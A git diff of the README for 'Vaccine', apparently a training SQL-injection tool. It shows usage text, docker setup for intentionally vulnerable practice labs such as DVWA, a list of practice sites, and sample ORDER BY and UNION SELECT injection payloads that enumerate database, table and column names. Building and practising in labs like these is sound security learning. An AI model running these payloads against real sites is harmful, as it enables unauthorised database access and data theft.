@@ -1,13 +1,27 @@
 # Vaccine
 
-# Usage
+## Usage
 
-- start running docker containers
+  ```
+  usage: vaccine.py [-h] [-o O] [-x X] [-i] URL
+
+  positional arguments:
+    URL
+
+  optional arguments:
+    -h, --help  show this help message and exit
+    -o O        Archive file, if not specified it will be stored in a default one.
+    -x X        Type of request, if not specified GET will be used.
+    -i          Specify talbe and column name using input.
+  ```
+
+- Start running docker containers
   ```
   make setup
   ```
 
-## [`Damn Vulnerable Web Application`](https://github.com/digininja/DVWA)
+
+### Damn Vulnerable Web Application [(github)](https://github.com/digininja/DVWA)
 
 |  | data |
 | - | - |
@@ -15,31 +29,31 @@
 | method | GET |
 | token | required |
 
-1. start docker container (`make setup`)
+1. Start docker container (`make setup`)
    ```
    docker run -it -d -p 8080:80 vulnerables/web-dvwa
    ```
-2. initialize database manually
+2. Initialize database manually
    - http://localhost:8080/setup.php
 
-3. login manually
+3. Login manually
    - http://localhost:8080/login.php
    ```
    username: admin
    password: password
    ```
 
-4. get cookie
+4. Get cookie
    - http://localhost:8080/index.php
    - get cookie value of `PHPSESSID`
      - inspect -> Application tab -> Storage -> Cookies
 
-5. set cookie to evn variable
+5. Set cookie to evn variable
    ```
    export TOKEN=YOUR_COOKIE
    ```
 
-## [`sqli-playground`](https://gitlab.cylab.be/cylab/play/sqlite-injection/)
+### sqli-playground [(github)](https://gitlab.cylab.be/cylab/play/sqlite-injection/)
 
 |  | data |
 | - | - |
@@ -47,18 +61,18 @@
 | method | POST |
 | token | - |
 
-1. start docker container (`make setup`)
+1. Start docker container (`make setup`)
    ```
    docker run -d -p 8000:80 gitlab.cylab.be:8081/cylab/play/sqlite-injection
    ```
 
-# Other SQL injection sites
+## Other SQL injection sites
 
 - https://altoromutual.com/login.jsp
 
 - https://redtiger.labs.overthewire.org/
 
-## ERROR
+### ERROR
 - Use `ORDER BY` to check numbers of colums
 ```
 ' ORDER BY 1--
@@ -66,9 +80,9 @@
 ...
 ```
 
-## UNION
+### UNION
 
-### MySQL
+#### MySQL
 - https://portswigger.net/web-security/sql-injection/union-attacks
 
 - Get database name
@@ -84,7 +98,7 @@
 ' UNION SELECT null, column_name FROM information_schema.columns WHERE table_name = 'users'#
 ```
 
-### SQLite
+#### SQLite
 
 - Get table_names
 ```
